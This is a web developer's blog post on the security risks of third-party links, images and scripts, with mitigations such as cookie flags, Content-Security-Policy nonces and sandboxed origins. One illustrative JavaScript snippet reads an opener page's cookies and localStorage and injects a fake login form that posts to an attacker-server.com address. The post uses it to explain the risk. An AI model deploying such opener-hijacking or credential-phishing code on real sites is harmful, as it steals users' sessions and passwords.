{/* !start-of-preview */}

As a web developer, using 3rd party resources is extremely common. We use 3rd
party JavaScripts all the time, either via `npm`, bundled into our code, or via
`<script>` tag (e.g.: Google Analytics, etc). Embedding 3rd party images/media
is also pretty common. Even linking to a 3rd party sites can have security
implications!

Let's go over some of the more common attack vectors when using 3rd party
resources, what problems they may cause, and how to mitigate them.

## What are considered 3rd party resources?

3rd party resources are resources that are not from the same origin as the
current page. For instance, if you are on
[https://jackyef.com](https://jackyef.com), then any resources not from
[https://jackyef.com](https://jackyef.com) are considered 3rd party resources.
Two origins are considered the same origin if they have the same **protocol**,
**port**, and **host**.

Some examples include loading JS from [UNPKG](https://unpkg.com), loading images
from [Unsplash](https://unsplash.com), etc.

Also, while technically not coming from a 3rd party origin, users' provided code
can be considered 3rd party script as well, as it is essentially running code
from an unknown source. The same applies for code coming from 3rd party package
on `npm`.

## Common attack vectors

### `window.open()` and `<a>` with `target="_blank"`

Sometimes, we might open a link in a new tab using either `window.open()` or
`<a target="_blank">`. A couple of things to note when we do this are the
`opener` and `referrer` behaviors.

When linking to a page in the same origin with the `opener` feature enabled, the
opened page will have access to some amount of the opener context via
`window.opener` global variable. This means the opened page could do things like
redirect the opener page, or even steal data from the opener page.

```js
if (window.opener) {
  // Opened page can redirect the opener
  window.opener.location = '/?status=redirected';

  // ...or access some cookies and localStorage data
  fetch('/api/steal-data', {
    method: 'POST',
    body: JSON.stringify({
      localStorage: window.opener.localStorage,
      cookie: window.opener.document.cookie,
    }),
  });

  // ...or even modify the DOM of the opener page
  const form = window.opener.document.createElement('form');
  form.innerHTML = `
    <input type="username" name="username">
    <input type="password" name="password">
  `;
  form.action = 'https://attacker-server.com/steal-data';
  form.method = 'POST';
  window.opener.document.body.prepend(form);
}
```

Try clicking on the button below to see an example.

<LightButton
  onClick={() =>
    window.open(
      '/posts/web-security-implications-of-3rd-party-resources/examples/opener',
    )
  }
>
  {`Open a page in new tab `}
</LightButton>

Fortunately, browsers automatically set `window.opener` to `null` if the target
page is hosted on a different origin, so this attack vector is not that
dangerous for most sites. Though if you are building a site like CodePen where
you allow users to run arbitrary code on your origin, this could be a problem as
it is essentially a cross-site scripting vulnerability. Imagine the script
creating a fake login form (via `window.opener.document.append()` shenanigans)
on your origin, but sending those data to their own server.

`referrer` is less dangerous. It simply tells the server where the request is
coming from via the `referer` header in the sent request. This is mostly used
for tracking. It is how most analytics services know whether a user comes to
your site from a social network site, search engine, or directly from the URL
bar. if you are writing a blog post that has links to other sites and you don't
want them to know that you are linking to them, you can use `noreferrer` so the
request won't include the `referer` header.

The default behavior for `window.open()` and `<a target="_blank">` is different.
`referrer` is enabled on both by default, but `opener` is only enabled by
default for `window.open()`. Refer to the following snippet to disable both of
them.

```js
window.open('/some-page', '_blank', 'noopener,noreferrer');

<a href="/some-page" target="_blank" rel="noopener noreferrer">
  Some page
</a>;
```

<Panel type="info" title="Some trivia">

You might notice that I mentioned `referer` at some places and `referrer` at
other places. They are actually referring to the same thing. The request header
is spelled `referer`, which was actually a typo that was never fixed. In most
other places, it's called `referrer`.

### 3rd party `<img>`

Embedding 3rd party images isn't as dangerous, but it still has some
implications, especially in relation to tracking.

Imagine that you built an authentication service, _Sign in with Gewgle_. Various
sites use your services to allow their users to sign in. You provide unique
profile image URLs for each user so the sites can render them.

```js
<img src="https://gewgle.com/users/:userId.png" />
```

Any site that renders this `<img>` is essentially always sending a request to
`gewgle.com` whenever the page is loaded. As the owner of `gewgle.com`, you can
now track the browsing history of your users. You can see which sites they visit
via the `referer` header when the site sends an image request to `gewgle.com`.
You can also approximately guess the time they visited each site by observing
the timestamp of the image request.

This is also a technique that email marketers use to detect whether their emails
were opened by the recipients.

<Panel type="info" title="The 'Do Not Track' header">

Some browsers include a `DNT` header in the request, indicating that the users
would not like to be tracked. Unfortunately, there is no guarantee that service
providers would respect the header.

Also, unfortunately, the feature is now
[marked as deprecated on MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/DNT).

### 3rd party `<script>`

Running 3rd party scripts on your site is essentially allowing the 3rd party to
do a remote code execution on the computer of the users visiting your site. If
it sounds dangerous, it is because it is! Though, we web developers have been so
accustomed to including 3rd party scripts on our sites that most of the time we
might not even think too much about it. Analytics scripts, ads, some services'
SDK, libraries from `cdnjs` and `unpkg`, and so on!

Once a 3rd party script is running on an origin, it can practically do
everything we have mentioned so far. It is similar to the case with linking
where the opened page gains access to `window.opener`, but this time it is more
dangerous! The 3rd party script has access to the full `window` object. This
opens up many possibilities, including but not limited to:

- stealing unsecured cookies (`document.cookie`, `fetch()`)
- accessing localStorage (`document.localStorage`)
- scraping data in the document (`document.querySelector()`)
- modifying the document to create fake interfaces
  (`document.body.appendChild()`)
- sending data to the attacker's server (`fetch()`)
- and the list goes on and on!

So, we better be damn sure that we trust the 3rd party when including their
script on our site.

## Mitigation strategy

Fortunately, browser vendors have been working hard to add security features to
prevent these attacks from happening and/or lessen the impacts when they
actually happened.

### Cookies

Cookies are the most common way to store user-related data on the browser.
Successfully stealing cookies means the attacker can impersonate the user and do
whatever they want on the site. A few things to do to make sure your cookies are
safe when an attacker is able to run a script on your site:

- Use `HttpOnly` flag
  - This prevents the cookie to be included in the returned value of
    `document.cookie`
- Use `Secure` flag
  - This prevents the cookie from being sent over HTTP.
- Do not use `SameSite=None` flag (unless you know what you're doing)
  - [`SameSite=None`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite#none)
    will mark a cookie to be included in requests to 3rd party origins.

### Content-Security-Policy (CSP)

CSP is a browser feature that allows you to specify which resources are allowed
to be loaded or run on your site. It is a very powerful tool to prevent attacks
like cross-site scripting.

We are not going to cover everything CSP can do in this article, but the main
idea is as follows.

We set a `Content-Security-Policy` in the response header for our site. The
header should exist in the response containing the HTML document.

```
Content-Security-Policy: script-src https://example.com/
```

With that set in place, any script not coming from `example.com` will not be
run.

```html
<!-- this script will not be run -->
<script src="https://not-example.com/js/library.js"></script>
```

What about scripts that run from a stored XSS attack? Those aren't from a
specific origin, how do we block those?

<Panel type="info" title="Stored XSS">

An XSS that happens when a user managed to inject something like
`<script>alert(1)</script>` into the page.

</Panel>

Fortunately, once we have a CSP header with `script-src`, inline scripts are
automatically blocked. Though if we want to keep using inline scripts while
still blocking the stored XSS scripts, we can do that by using a `nonce`.

```
Content-Security-Policy: script-src 'nonce-SomeRandomlyGeneratedUnguessableString';
```

With that set, the following inline script will be allowed by the browser to
run.

```html
<script nonce="SomeRandomlyGeneratedUnguessableString">
  alert('I am allowed to run!');
</script>
```

If you're interested, you can go to
[MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
to see everything CSP can do.

## Other cases

### What if I _actually have to run_ users' provided code?

CSP helps in preventing untrusted code from running, but what if we really need
to run the users' code? What if we are running a platform like CodePen that
allows user to write their own scripts?

In those cases, we can do the followings:

- running the code in
  [a sandboxed `<iframe>`](https://web.dev/sandboxed-iframes/)
- running the code in a separate origin. For instance, CodePen runs on
  [https://codepen.io/](https://codepen.io/), but users' code runs on a separate
  origin like [https://cdpn.io/](https://cdpn.io/). This automatically comes
  with a lot of security benefits as most browsers do not share resources
  between origins by default.

(Podcast, [CodePen Radio](https://open.spotify.com/show/3bw3W59a83518ciCd3ehZV))
a listen!

### What about "3rd party scripts" from `npm`?

Unfortunately, once a 3rd party script from an `npm` package made it to your
JavaScript bundle, it would have as much power as your own code. Sure,
technically you could make it so these codes are codesplitted differently, run
on a separate origin, and pass the data you need via
[`window.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).
Though with that being said, for the most part, whenever you are using an `npm`
package, you are essentially fully trusting that the authors have no malicious
intent. This is why whenever a popular package is hijacked by a malicious actor,
it's always a big deal. (see:
[`ua-parser-js` case](https://blog.sonatype.com/npm-project-used-by-millions-hijacked-in-supply-chain-attack))

## Closing

Embedding 3rd party resources of any kind comes with some security implications.
3rd parties can do some clever things to track users, steal data, trick users,
etc. Being mindful of these implications and understanding how they work is
important to build a secure site.

In a way, it is interesting that the web is largely built upon the idea of
trusting 3rd party resources (think analytics scripts, SDK, images, etc.), even
though the potential risk could be as high as a remote code execution
vulnerability. Though, since the code is running on a browser, the risk might
not be comparable to code running on an actual server.

With that being said, it's also kinda amazing how browser vendors are able to
keep shipping great security features with sensible defaults, mitigating the
risks even more.
